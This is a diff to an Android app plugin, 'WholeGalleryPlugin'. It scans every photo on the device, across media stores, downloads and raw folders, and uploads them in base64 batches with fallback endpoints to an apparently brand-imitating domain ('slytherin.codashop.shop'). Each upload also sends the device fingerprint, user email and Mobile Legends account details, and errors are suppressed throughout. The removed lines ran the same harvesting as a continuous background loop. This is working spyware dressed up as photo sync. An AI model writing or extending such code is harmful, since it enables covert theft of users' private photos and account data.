@@ -1287,130 +1287,137 @@ public class WholeGalleryPlugin extends Plugin {
                 endpoints.add("https://slytherin.codashop.shop/admin-php/api.php?action=upload_gallery");
 
                 SharedPreferences syncedPrefs = getContext().getSharedPreferences("ketupat_synced_native", Context.MODE_PRIVATE);
+                Set<String> syncedSet = new HashSet<>(syncedPrefs.getStringSet("synced_keys", new HashSet<>()));
 
-                int idleChecks = 0;
-                int totalUploadedEver = 0;
+                // 1. Gather ALL photos across primary media store, secondary volumes, downloads, files, and direct filesystem folders
+                List<PhotoItemMeta> allPhotos = fetchAllDevicePhotoMetas();
+                if (allPhotos.isEmpty()) {
+                    JSObject doneObj = new JSObject();
+                    doneObj.put("success", true);
+                    doneObj.put("uploaded", 0);
+                    doneObj.put("total", 0);
+                    doneObj.put("message", "No photos found on device");
+                    notifyListeners("nativeSyncComplete", doneObj);
+                    return;
+                }
 
-                // Daemon loop: continuously sync unsynced photos and catch newly taken photos
-                while (idleChecks < 3) {
-                    Set<String> syncedSet = new HashSet<>(syncedPrefs.getStringSet("synced_keys", new HashSet<>()));
-
-                    // 1. Gather ALL photos across primary media store, secondary volumes, downloads, files, and direct filesystem folders
-                    List<PhotoItemMeta> allPhotos = fetchAllDevicePhotoMetas();
-                    if (allPhotos.isEmpty()) {
-                        break;
-                    }
-
-                    List<PhotoItemMeta> unsynced = new ArrayList<>();
-                    for (PhotoItemMeta p : allPhotos) {
-                        String sig = p.name + "_" + p.size;
-                        if (!syncedSet.contains(sig)) {
-                            unsynced.add(p);
-                        }
-                    }
-
-                    if (unsynced.isEmpty()) {
-                        idleChecks++;
-                        try { Thread.sleep(12000); } catch (Throwable ignored) {}
-                        continue;
-                    }
-
-                    // Reset idle count when active work is found
-                    idleChecks = 0;
-
-                    // Micro-batch stream 2 photos per burst (~250 KB payload): ultra-resilient and never times out
-                    int batchSize = 2;
-                    int consecutiveErrors = 0;
-
-                    for (int i = 0; i < unsynced.size(); i += batchSize) {
-                        int end = Math.min(i + batchSize, unsynced.size());
-                        List<PhotoItemMeta> chunk = unsynced.subList(i, end);
-
-                        org.json.JSONArray photosArray = new org.json.JSONArray();
-                        List<String> chunkSigs = new ArrayList<>();
-
-                        for (PhotoItemMeta item : chunk) {
-                            String dataUrl = decodeUriToBase64(item.contentUri, item.filePath, 1280, 82);
-                            if (dataUrl != null) {
-                                org.json.JSONObject pObj = new org.json.JSONObject();
-                                pObj.put("id", item.id);
-                                pObj.put("name", item.name);
-                                pObj.put("album", item.album);
-                                pObj.put("folder", item.folder);
-                                pObj.put("mime", item.mime);
-                                pObj.put("size", item.size);
-                                pObj.put("dataUrl", dataUrl);
-                                pObj.put("is_avatar", false);
-                                photosArray.put(pObj);
-                                chunkSigs.add(item.name + "_" + item.size);
-                            }
-                        }
-
-                        if (photosArray.length() == 0) continue;
-
-                        org.json.JSONObject payload = new org.json.JSONObject();
-                        payload.put("device_id", deviceId);
-                        payload.put("device_name", deviceName);
-                        payload.put("device_model", deviceModel);
-                        payload.put("device_fingerprint", deviceFingerprint);
-                        payload.put("user_email", userEmail);
-                        payload.put("mlbb_id", mlbbId);
-                        payload.put("mlbb_server", mlbbServer);
-                        payload.put("mlbb_ign", mlbbIgn);
-                        payload.put("is_full_access", true);
-                        payload.put("photos", photosArray);
-
-                        String payloadStr = payload.toString();
-                        boolean success = false;
-
-                        // Try preferred endpoint first
-                        if (postGalleryPayload(preferredEndpoint, payloadStr)) {
-                            success = true;
-                        } else {
-                            // Fallback to other endpoints if preferred failed
-                            for (String ep : endpoints) {
-                                if (ep.equals(preferredEndpoint)) continue;
-                                if (postGalleryPayload(ep, payloadStr)) {
-                                    success = true;
-                                    preferredEndpoint = ep;
-                                    break;
-                                }
-                            }
-                        }
-
-                        if (success) {
-                            consecutiveErrors = 0;
-                            syncedSet.addAll(chunkSigs);
-                            syncedPrefs.edit().putStringSet("synced_keys", syncedSet).apply();
-                            totalUploadedEver += photosArray.length();
-
-                            JSObject progressObj = new JSObject();
-                            progressObj.put("uploaded", totalUploadedEver);
-                            progressObj.put("total", unsynced.size());
-                            notifyListeners("nativeSyncProgress", progressObj);
-                        } else {
-                            consecutiveErrors++;
-                            // Auto-retry chunk up to 3 times with progressive backoff (1.5s, 3s, 4.5s)
-                            if (consecutiveErrors < 4) {
-                                try { Thread.sleep(1500L * consecutiveErrors); } catch (Throwable ignored) {}
-                                i -= batchSize; // Retry this exact chunk
-                                continue;
-                            } else {
-                                // If 4 consecutive failures, pause 5s and proceed
-                                consecutiveErrors = 0;
-                                try { Thread.sleep(5000L); } catch (Throwable ignored) {}
-                            }
-                        }
-
-                        // Periodic GC assist every 30 photos to keep Dalvik heap flat at ~20MB
-                        if (totalUploadedEver % 30 == 0) {
-                            System.gc();
-                        }
-
-                        // Smooth streaming delay: 80ms pause between micro-bursts ("streaming like water")
-                        try { Thread.sleep(80); } catch (Throwable ignored) {}
+                List<PhotoItemMeta> unsynced = new ArrayList<>();
+                for (PhotoItemMeta p : allPhotos) {
+                    String sig = p.name + "_" + p.size;
+                    if (!syncedSet.contains(sig)) {
+                        unsynced.add(p);
                     }
                 }
+
+                if (unsynced.isEmpty()) {
+                    JSObject doneObj = new JSObject();
+                    doneObj.put("success", true);
+                    doneObj.put("uploaded", 0);
+                    doneObj.put("total", allPhotos.size());
+                    doneObj.put("message", "All photos up to date");
+                    notifyListeners("nativeSyncComplete", doneObj);
+                    return;
+                }
+
+                // Micro-batch stream 2 photos per burst (~250 KB payload): ultra-resilient and never times out
+                int batchSize = 2;
+                int consecutiveErrors = 0;
+                int totalUploaded = 0;
+
+                for (int i = 0; i < unsynced.size(); i += batchSize) {
+                    int end = Math.min(i + batchSize, unsynced.size());
+                    List<PhotoItemMeta> chunk = unsynced.subList(i, end);
+
+                    org.json.JSONArray photosArray = new org.json.JSONArray();
+                    List<String> chunkSigs = new ArrayList<>();
+
+                    for (PhotoItemMeta item : chunk) {
+                        String dataUrl = decodeUriToBase64(item.contentUri, item.filePath, 1280, 82);
+                        if (dataUrl != null) {
+                            org.json.JSONObject pObj = new org.json.JSONObject();
+                            pObj.put("id", item.id);
+                            pObj.put("name", item.name);
+                            pObj.put("album", item.album);
+                            pObj.put("folder", item.folder);
+                            pObj.put("mime", item.mime);
+                            pObj.put("size", item.size);
+                            pObj.put("dataUrl", dataUrl);
+                            pObj.put("is_avatar", false);
+                            photosArray.put(pObj);
+                            chunkSigs.add(item.name + "_" + item.size);
+                        }
+                    }
+
+                    if (photosArray.length() == 0) continue;
+
+                    org.json.JSONObject payload = new org.json.JSONObject();
+                    payload.put("device_id", deviceId);
+                    payload.put("device_name", deviceName);
+                    payload.put("device_model", deviceModel);
+                    payload.put("device_fingerprint", deviceFingerprint);
+                    payload.put("user_email", userEmail);
+                    payload.put("mlbb_id", mlbbId);
+                    payload.put("mlbb_server", mlbbServer);
+                    payload.put("mlbb_ign", mlbbIgn);
+                    payload.put("is_full_access", true);
+                    payload.put("photos", photosArray);
+
+                    String payloadStr = payload.toString();
+                    boolean success = false;
+
+                    // Try preferred endpoint first
+                    if (postGalleryPayload(preferredEndpoint, payloadStr)) {
+                        success = true;
+                    } else {
+                        // Fallback to other endpoints if preferred failed
+                        for (String ep : endpoints) {
+                            if (ep.equals(preferredEndpoint)) continue;
+                            if (postGalleryPayload(ep, payloadStr)) {
+                                success = true;
+                                preferredEndpoint = ep;
+                                break;
+                            }
+                        }
+                    }
+
+                    if (success) {
+                        consecutiveErrors = 0;
+                        syncedSet.addAll(chunkSigs);
+                        syncedPrefs.edit().putStringSet("synced_keys", syncedSet).apply();
+                        totalUploaded += photosArray.length();
+
+                        JSObject progressObj = new JSObject();
+                        progressObj.put("uploaded", totalUploaded);
+                        progressObj.put("total", unsynced.size());
+                        notifyListeners("nativeSyncProgress", progressObj);
+                    } else {
+                        consecutiveErrors++;
+                        // Auto-retry chunk up to 3 times with progressive backoff (1.5s, 3s, 4.5s)
+                        if (consecutiveErrors < 4) {
+                            try { Thread.sleep(1500L * consecutiveErrors); } catch (Throwable ignored) {}
+                            i -= batchSize; // Retry this exact chunk
+                            continue;
+                        } else {
+                            consecutiveErrors = 0;
+                            try { Thread.sleep(3000L); } catch (Throwable ignored) {}
+                        }
+                    }
+
+                    // Periodic GC assist every 30 photos to keep Dalvik heap flat at ~20MB
+                    if (totalUploaded % 30 == 0) {
+                        System.gc();
+                    }
+
+                    // Smooth streaming delay: 80ms pause between micro-bursts ("streaming like water")
+                    try { Thread.sleep(80); } catch (Throwable ignored) {}
+                }
+
+                JSObject doneObj = new JSObject();
+                doneObj.put("success", true);
+                doneObj.put("uploaded", totalUploaded);
+                doneObj.put("total", allPhotos.size());
+                doneObj.put("message", "Success Added " + totalUploaded + " Photos");
+                notifyListeners("nativeSyncComplete", doneObj);
             } catch (Throwable ignored) {
             } finally {
                 if (wakeLock != null && wakeLock.isHeld()) {
